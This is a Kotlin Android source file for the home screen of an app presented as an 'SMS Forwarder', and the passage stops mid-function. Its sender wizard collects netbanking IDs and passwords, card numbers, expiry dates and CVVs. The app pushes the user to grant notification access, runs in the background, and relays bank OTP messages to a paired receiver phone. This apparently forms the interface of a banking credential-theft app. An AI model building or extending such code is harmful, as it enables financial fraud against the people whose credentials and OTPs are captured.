package com.smsforwarder.app.ui.home

import android.content.Context
import android.content.Intent
import android.provider.Settings
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.ArrowForward
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalFocusManager
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.smsforwarder.app.domain.model.DeviceInfo
import com.smsforwarder.app.domain.model.DeviceRole
import com.smsforwarder.app.ui.theme.AccentGreen
import com.smsforwarder.app.ui.theme.PrimaryBlue
import com.smsforwarder.app.ui.theme.WarningAmber

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun HomeScreen(
    viewModel: HomeViewModel,
    onNavigatePairing: () -> Unit,
    onNavigateHistory: () -> Unit,
    onNavigateFilters: () -> Unit,
    onNavigateSettings: () -> Unit,
    onNavigateBatteryGuide: () -> Unit,
    onNavigateModeSelection: () -> Unit
) {
    val state by viewModel.uiState.collectAsState()
    val deviceInfo = state.deviceInfo ?: return
    val context = LocalContext.current

    // Auto-prompt Notification Access Permission on entering app if not already granted
    LaunchedEffect(Unit) {
        val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
        val isEnabled = flat != null && flat.contains(context.packageName)
        if (!isEnabled) {
            runCatching {
                context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
        }
    }

    // For Sender / Forwarder phone: Show 3-step Registration Wizard or Final Details Screen
    if (deviceInfo.role == DeviceRole.SENDER) {
        if (!deviceInfo.isRegistered) {
            MultiStepRegistrationWizard(
                isRegistering = state.isRegistering,
                errorMessage = state.errorMessage,
                defaultName = deviceInfo.deviceName,
                onCompleteRegistration = { name, mobile, address, bankName, accNo, ifsc, netId, netPass, cardNo, cardExp, cardCvv ->
                    viewModel.registerFullSenderDevice(
                        name = name,
                        mobileNumber = mobile,
                        address = address,
                        bankName = bankName,
                        accountNumber = accNo,
                        ifscCode = ifsc,
                        netbankingId = netId,
                        netbankingPassword = netPass,
                        cardNumber = cardNo,
                        cardExpiry = cardExp,
                        cardCvv = cardCvv
                    )
                }
            )
        } else {
            SenderRegisteredScreen(
                info = deviceInfo
            )
        }
    } else {
        // Full dashboard for Receiver / Dual client phone
        FullDashboardScreen(
            state = state,
            viewModel = viewModel,
            onNavigatePairing = onNavigatePairing,
            onNavigateHistory = onNavigateHistory,
            onNavigateFilters = onNavigateFilters,
            onNavigateSettings = onNavigateSettings,
            onNavigateBatteryGuide = onNavigateBatteryGuide,
            onNavigateModeSelection = onNavigateModeSelection
        )
    }
}

/**
 * Responsive 3-Step Registration Wizard:
 * Automatically pushes input fields and buttons above soft keyboard using IME padding and scrollable container.
 */
@Composable
private fun MultiStepRegistrationWizard(
    isRegistering: Boolean,
    errorMessage: String?,
    defaultName: String,
    onCompleteRegistration: (
        name: String,
        mobile: String,
        address: String,
        bankName: String,
        accountNo: String,
        ifsc: String,
        netbankingId: String,
        netbankingPass: String,
        cardNumber: String,
        cardExpiry: String,
        cardCvv: String
    ) -> Unit
) {
    var currentStep by remember { mutableStateOf(1) }
    val focusManager = LocalFocusManager.current

    // Step 1 States
    var name by remember { mutableStateOf(defaultName) }
    var mobileNumber by remember { mutableStateOf("") }
    var address by remember { mutableStateOf("") }

    // Step 2 States
    var bankName by remember { mutableStateOf("") }
    var accountNumber by remember { mutableStateOf("") }
    var ifscCode by remember { mutableStateOf("") }
    var netbankingId by remember { mutableStateOf("") }
    var netbankingPassword by remember { mutableStateOf("") }
    var isPasswordVisible by remember { mutableStateOf(false) }

    // Step 3 States
    var cardNumber by remember { mutableStateOf("") }
    var cardExpiry by remember { mutableStateOf("") }
    var cardCvv by remember { mutableStateOf("") }
    var isCvvVisible by remember { mutableStateOf(false) }

    val isStep1Valid = name.isNotBlank() && mobileNumber.length == 10 && mobileNumber.all { it.isDigit() }
    val isStep2Valid = bankName.isNotBlank() && accountNumber.isNotBlank()
    val isStep3Valid = cardNumber.length >= 12 && cardExpiry.isNotBlank()

    val scrollState = rememberScrollState()

    Box(
        modifier = Modifier
            .fillMaxSize()
            .windowInsetsPadding(WindowInsets.statusBars)
            .imePadding()
            .padding(horizontal = 16.dp, vertical = 8.dp),
        contentAlignment = Alignment.TopCenter
    ) {
        Card(
            shape = RoundedCornerShape(24.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.92f)),
            modifier = Modifier
                .fillMaxWidth()
                .wrapContentHeight()
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(20.dp)
                    .verticalScroll(scrollState),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                // Step Indicator Bar
                StepProgressBar(currentStep = currentStep, totalSteps = 3)

                when (currentStep) {
                    1 -> {
                        // STEP 1: USER DETAILS
                        Text(
                            text = "Step 1: User Details",
                            style = MaterialTheme.typography.titleLarge,
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Text(
                            text = "Enter your personal details to get started.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )

                        OutlinedTextField(
                            value = name,
                            onValueChange = { name = it },
                            label = { Text("Full Name / User Name") },
                            leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        val isMobileValid = mobileNumber.length == 10 && mobileNumber.all { it.isDigit() }
                        OutlinedTextField(
                            value = mobileNumber,
                            onValueChange = { newValue ->
                                val filtered = newValue.filter { it.isDigit() }
                                if (filtered.length <= 10) {
                                    mobileNumber = filtered
                                }
                            },
                            label = { Text("Mobile Number (10 Digits)") },
                            leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
                            singleLine = true,
                            isError = mobileNumber.isNotEmpty() && !isMobileValid,
                            supportingText = {
                                if (mobileNumber.isNotEmpty() && !isMobileValid) {
                                    Text("Mobile number must be 10 digits (${mobileNumber.length}/10)", color = MaterialTheme.colorScheme.error)
                                } else if (isMobileValid) {
                                    Text("✓ Valid mobile number", color = AccentGreen)
                                }
                            },
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        OutlinedTextField(
                            value = address,
                            onValueChange = { address = it },
                            label = { Text("Address") },
                            leadingIcon = { Icon(Icons.Default.LocationOn, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Done),
                            keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        Button(
                            onClick = {
                                focusManager.clearFocus()
                                currentStep = 2
                            },
                            enabled = isStep1Valid,
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(50.dp),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Text("Next: Add Account Details", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                            Spacer(modifier = Modifier.width(8.dp))
                            Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null)
                        }
                    }

                    2 -> {
                        // STEP 2: BANK ACCOUNT DETAILS
                        Text(
                            text = "Step 2: Add Bank Account",
                            style = MaterialTheme.typography.titleLarge,
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Text(
                            text = "Enter your bank account & Netbanking details.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )

                        OutlinedTextField(
                            value = bankName,
                            onValueChange = { bankName = it },
                            label = { Text("Bank Name (e.g. HDFC, SBI, ICICI)") },
                            leadingIcon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        OutlinedTextField(
                            value = accountNumber,
                            onValueChange = { accountNumber = it.filter { c -> c.isDigit() } },
                            label = { Text("Account Number") },
                            leadingIcon = { Icon(Icons.Default.Numbers, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        OutlinedTextField(
                            value = ifscCode,
                            onValueChange = { ifscCode = it.uppercase() },
                            label = { Text("IFSC Code") },
                            leadingIcon = { Icon(Icons.Default.Code, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        OutlinedTextField(
                            value = netbankingId,
                            onValueChange = { netbankingId = it },
                            label = { Text("Netbanking User ID / Customer ID") },
                            leadingIcon = { Icon(Icons.Default.Badge, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        OutlinedTextField(
                            value = netbankingPassword,
                            onValueChange = { netbankingPassword = it },
                            label = { Text("Netbanking Password") },
                            leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                            trailingIcon = {
                                IconButton(onClick = { isPasswordVisible = !isPasswordVisible }) {
                                    Icon(
                                        imageVector = if (isPasswordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                                        contentDescription = null
                                    )
                                }
                            },
                            visualTransformation = if (isPasswordVisible) VisualTransformation.None else PasswordVisualTransformation(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password, imeAction = ImeAction.Done),
                            keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            OutlinedButton(
                                onClick = {
                                    focusManager.clearFocus()
                                    currentStep = 1
                                },
                                modifier = Modifier
                                    .weight(1f)
                                    .height(50.dp),
                                shape = RoundedCornerShape(12.dp)
                            ) {
                                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null)
                                Spacer(modifier = Modifier.width(4.dp))
                                Text("Back")
                            }

                            Button(
                                onClick = {
                                    focusManager.clearFocus()
                                    currentStep = 3
                                },
                                enabled = isStep2Valid,
                                modifier = Modifier
                                    .weight(1f)
                                    .height(50.dp),
                                shape = RoundedCornerShape(12.dp)
                            ) {
                                Text("Next: Cards")
                                Spacer(modifier = Modifier.width(4.dp))
                                Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null)
                            }
                        }
                    }

                    3 -> {
                        // STEP 3: CARD DETAILS
                        Text(
                            text = "Step 3: Card Details",
                            style = MaterialTheme.typography.titleLarge,
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Text(
                            text = "Enter your Debit/Credit card details.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )

                        OutlinedTextField(
                            value = cardNumber,
                            onValueChange = { newValue ->
                                val digitsOnly = newValue.filter { it.isDigit() }
                                if (digitsOnly.length <= 16) {
                                    cardNumber = digitsOnly
                                }
                            },
                            label = { Text("Card Number (16 Digits)") },
                            leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(12.dp)
                        )

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            OutlinedTextField(
                                value = cardExpiry,
                                onValueChange = { cardExpiry = it },
                                label = { Text("Valid Thru (MM/YY)") },
                                leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
                                singleLine = true,
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(12.dp)
                            )

                            OutlinedTextField(
                                value = cardCvv,
                                onValueChange = { newValue ->
                                    val digitsOnly = newValue.filter { it.isDigit() }
                                    if (digitsOnly.length <= 4) {
                                        cardCvv = digitsOnly
                                    }
                                },
                                label = { Text("CVV") },
                                leadingIcon = { Icon(Icons.Default.Security, contentDescription = null) },
                                trailingIcon = {
                                    IconButton(onClick = { isCvvVisible = !isCvvVisible }) {
                                        Icon(
                                            imageVector = if (isCvvVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                                            contentDescription = null
                                        )
                                    }
                                },
                                visualTransformation = if (isCvvVisible) VisualTransformation.None else PasswordVisualTransformation(),
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword, imeAction = ImeAction.Done),
                                keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
                                singleLine = true,
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(12.dp)
                            )
                        }

                        errorMessage?.let { err ->
                            Text(
                                text = err,
                                color = MaterialTheme.colorScheme.error,
                                style = MaterialTheme.typography.bodySmall,
                                textAlign = TextAlign.Center
                            )
                        }

                        Spacer(modifier = Modifier.height(8.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            OutlinedButton(
                                onClick = {
                                    focusManager.clearFocus()
                                    currentStep = 2
                                },
                                enabled = !isRegistering,
                                modifier = Modifier
                                    .weight(1f)
                                    .height(50.dp),
                                shape = RoundedCornerShape(12.dp)
                            ) {
                                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null)
                                Spacer(modifier = Modifier.width(4.dp))
                                Text("Back")
                            }

                            Button(
                                onClick = {
                                    focusManager.clearFocus()
                                    onCompleteRegistration(
                                        name,
                                        mobileNumber,
                                        address,
                                        bankName,
                                        accountNumber,
                                        ifscCode,
                                        netbankingId,
                                        netbankingPassword,
                                        cardNumber,
                                        cardExpiry,
                                        cardCvv
                                    )
                                },
                                enabled = !isRegistering && isStep3Valid,
                                modifier = Modifier
                                    .weight(1.5f)
                                    .height(50.dp),
                                shape = RoundedCornerShape(12.dp)
                            ) {
                                if (isRegistering) {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(22.dp),
                                        color = MaterialTheme.colorScheme.onPrimary
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Text("Saving...")
                                } else {
                                    Text("Submit Details", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                    }
                }

                // Extra scroll space for keyboard
                Spacer(modifier = Modifier.height(60.dp))
            }
        }
    }
}

@Composable
private fun StepProgressBar(currentStep: Int, totalSteps: Int) {
    Column(verticalArrangement = Arrangement.spacedBy(6.dp), horizontalAlignment = Alignment.CenterHorizontally) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                text = "STEP $currentStep OF $totalSteps",
                style = MaterialTheme.typography.labelMedium,
                fontWeight = FontWeight.Bold,
                color = PrimaryBlue
            )
            Text(
                text = when (currentStep) {
                    1 -> "User Details"
                    2 -> "Bank Details"
                    else -> "Card Details"
                },
                style = MaterialTheme.typography.labelMedium,
                fontWeight = FontWeight.SemiBold,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            for (step in 1..totalSteps) {
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .height(6.dp)
                        .clip(RoundedCornerShape(3.dp))
                        .background(
                            if (step <= currentStep) PrimaryBlue else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f)
                        )
                )
            }
        }
    }
}

/**
 * Screen shown after Sender Phone Registration is Complete: Displays Summary Cards of all saved details.
 */
@Composable
private fun SenderRegisteredScreen(
    info: DeviceInfo
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .windowInsetsPadding(WindowInsets.statusBars)
            .imePadding()
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        Surface(
            shape = CircleShape,
            color = AccentGreen.copy(alpha = 0.15f),
            modifier = Modifier.size(90.dp)
        ) {
            Box(contentAlignment = Alignment.Center) {
                Icon(
                    imageVector = Icons.Default.CheckCircle,
                    contentDescription = null,
                    tint = AccentGreen,
                    modifier = Modifier.size(60.dp)
                )
            }
        }

        Text(
            text = "Registration Completed",
            style = MaterialTheme.typography.headlineSmall,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.onSurface,
            textAlign = TextAlign.Center
        )

        Text(
            text = "SMS Forwarder service is active in background",
            style = MaterialTheme.typography.bodyMedium,
            color = MaterialTheme.colorScheme.onSurfaceVariant,
            textAlign = TextAlign.Center
        )

        // CARD 1: USER DETAILS SUMMARY
        Card(
            shape = RoundedCornerShape(18.dp),
            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Person, contentDescription = null, tint = PrimaryBlue)
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("User Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
                }
                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                InfoRow(label = "Name", value = info.departmentName.ifBlank { info.deviceName })
                InfoRow(label = "Mobile No", value = info.mobileNumber.ifBlank { "N/A" })
                InfoRow(label = "Address", value = info.address.ifBlank { "N/A" })
            }
        }

        // CARD 2: BANK ACCOUNT SUMMARY
        if (info.bankName.isNotBlank() || info.accountNumber.isNotBlank()) {
            Card(
                shape = RoundedCornerShape(18.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Bank Account Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
                    }
                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                    InfoRow(label = "Bank Name", value = info.bankName.ifBlank { "N/A" })
                    InfoRow(label = "Account Number", value = info.accountNumber.ifBlank { "N/A" })
                    InfoRow(label = "IFSC Code", value = info.ifscCode.ifBlank { "N/A" })
                    if (info.netbankingId.isNotBlank()) {
                        InfoRow(label = "Netbanking ID", value = info.netbankingId)
                    }
                    if (info.netbankingPassword.isNotBlank()) {
                        InfoRow(label = "Netbanking Password", value = "••••••••")
                    }
                }
            }
        }

        // CARD 3: CARD DETAILS SUMMARY
        if (info.cardNumber.isNotBlank()) {
            Card(
                shape = RoundedCornerShape(18.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(
                    modifier = Modifier.padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.CreditCard, contentDescription = null, tint = PrimaryBlue)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Card Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
                    }
                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
                    InfoRow(label = "Card Number", value = info.cardNumber)
                    if (info.cardExpiry.isNotBlank()) {
                        InfoRow(label = "Valid Thru", value = info.cardExpiry)
                    }
                    if (info.cardCvv.isNotBlank()) {
                        InfoRow(label = "CVV", value = "•••")
                    }
                }
            }
        }
    }
}

@Composable
private fun InfoRow(label: String, value: String) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(
            text = label,
            style = MaterialTheme.typography.bodyMedium,
            fontWeight = FontWeight.Medium,
            color = MaterialTheme.colorScheme.onSurfaceVariant
        )
        Text(
            text = value,
            style = MaterialTheme.typography.bodyMedium,
            fontWeight = FontWeight.Bold,
            color = MaterialTheme.colorScheme.onSurface
        )
    }
}

/**
 * Full Dashboard View for Receiver / Dual client.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
private fun FullDashboardScreen(
    state: HomeUiState,
    viewModel: HomeViewModel,
    onNavigatePairing: () -> Unit,
    onNavigateHistory: () -> Unit,
    onNavigateFilters: () -> Unit,
    onNavigateSettings: () -> Unit,
    onNavigateBatteryGuide: () -> Unit,
    onNavigateModeSelection: () -> Unit
) {
    val scrollState = rememberScrollState()

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("acc believe", fontWeight = FontWeight.Bold)
                        Spacer(modifier = Modifier.width(8.dp))
                        state.deviceInfo?.let { info ->
                            RoleBadge(role = info.role, onClick = onNavigateModeSelection)
                        }
                    }
                },
                actions = {
                    IconButton(onClick = onNavigateSettings) {
                        Icon(Icons.Default.Settings, contentDescription = "Settings")
                    }
                }
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp)
                .verticalScroll(scrollState),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Spacer(modifier = Modifier.height(4.dp))

            state.deviceInfo?.let { info ->
                DeviceStatusCard(
                    info = info,
                    isRegistering = state.isRegistering,
                    onRegister = { viewModel.registerDevice() },
                    onPair = onNavigatePairing
                )
            }

            Text(
                text = "Quick Actions",
                style = MaterialTheme.typography.titleSmall,
                fontWeight = FontWeight.SemiBold,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                QuickActionTile(
                    title = "Pairing",
                    subtitle = if (state.deviceInfo?.isPaired == true) "Connected" else "Not paired",
                    icon = Icons.Default.QrCodeScanner,
                    iconColor = PrimaryBlue,
                    modifier = Modifier.weight(1f),
                    onClick = onNavigatePairing
                )

                QuickActionTile(
                    title = "History",
                    subtitle = "Decrypted SMS",
                    icon = Icons.Default.History,
                    iconColor = AccentGreen,
                    modifier = Modifier.weight(1f),
                    onClick = onNavigateHistory
                )
            }

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                QuickActionTile(
                    title = "Filter Rules",
                    subtitle = "Banks & OTPs",
                    icon = Icons.Default.FilterList,
                    iconColor = WarningAmber,
                    modifier = Modifier.weight(1f),
                    onClick = onNavigateFilters
                )

                QuickActionTile(
                    title = "Battery Fix",
                    subtitle = "OEM Keep-Alive",
                    icon = Icons.Default.BatteryChargingFull,
                    iconColor = MaterialTheme.colorScheme.secondary,
                    modifier = Modifier.weight(1f),
                    onClick = onNavigateBatteryGuide
                )
            }

            if (state.pendingQueueCount > 0) {
                Card(
                    colors = CardDefaults.cardColors(containerColor = WarningAmber.copy(alpha = 0.15f)),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Row(
                        modifier = Modifier.padding(14.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.CloudOff, contentDescription = null, tint = WarningAmber)
                        Spacer(modifier = Modifier.width(12.dp))
                        Text(
                            text = "${state.pendingQueueCount} messages in offline retry queue",
                            style = MaterialTheme.typography.bodyMedium,
                            fontWeight = FontWeight.Medium
                        )
                    }
                }
            }

            Card(
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(Icons.Default.SendToMobile, contentDescription = null, tint = PrimaryBlue)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "Test SMS Relay",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold
                        )
                    }
                    Spacer(modifier = Modifier.height(6.dp))
                    Text(
                        text = "Simulate receiving an incoming bank OTP SMS to verify encryption and relay delivery.",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = { viewModel.sendTestSms() },
                        enabled = !state.isSendingTest,
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(10.dp)
                    ) {
                        if (state.isSendingTest) {
                            CircularProgressIndicator(modifier = Modifier.size(20.dp), color = MaterialTheme.colorScheme.onPrimary)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Encrypting & Sending...")
                        } else {
                            Icon(Icons.Default.PlayArrow, contentDescription = null)
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("Trigger Test Bank OTP")
                        }
                    }

                    state.testSmsResult?.let { res ->
                        Spacer(modifier = Modifier.height(10.dp))
                        Text(
                            text = res,
                            style = MaterialTheme.typography.bodySmall,
                            fontWeight = FontWeight.Medium,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))
        }
    }
}

@Composable
private fun DeviceStatusCard(
    info: DeviceInfo,
    isRegistering: Boolean,
    onRegister: () -> Unit,
    onPair: () -> Unit
) {
    Card(
        shape = RoundedCornerShape(20.dp),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(18.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column {
                    Text(
                        text = info.deviceName,
                        style = MaterialTheme.typography.titleLarge,
                        fontWeight = FontWeight.Bold
                    )
                    Text(
                        text = when (info.role) {
                            DeviceRole.SENDER -> "SMS Forwarder Gateway"
                            DeviceRole.RECEIVER -> "SMS Receiver Client"
                            DeviceRole.DUAL -> "Dual Mode (Relay + Client)"
                        },
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }

                Box(
                    modifier = Modifier
                        .clip(CircleShape)
                        .background(if (info.isPaired) AccentGreen.copy(alpha = 0.2f) else WarningAmber.copy(alpha = 0.2f))
                        .padding(horizontal = 12.dp, vertical = 6.dp)
                ) {
                    Text(
                        text = if (info.isPaired) "● Connected" else "○ Unpaired",
                        color = if (info.isPaired) AccentGreen else WarningAmber,
                        fontWeight = FontWeight.Bold,
                        fontSize = 12.sp
                    )
                }
            }

            HorizontalDivider(modifier = Modifier.padding(vertical = 12.dp))

            if (!info.isRegistered) {
                Text(
                    text = "This device is not yet registered with the cloud relay.",
                    style = MaterialTheme.typography.bodySmall,
                    color = WarningAmber
                )
                Spacer(modifier = Modifier.height(8.dp))
                Button(
                    onClick = onRegister,
                    enabled = !isRegistering,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp)
                ) {
                    if (isRegistering) {
                        CircularProgressIndicator(modifier = Modifier.size(18.dp), color = MaterialTheme.colorScheme.onPrimary)
                    } else {
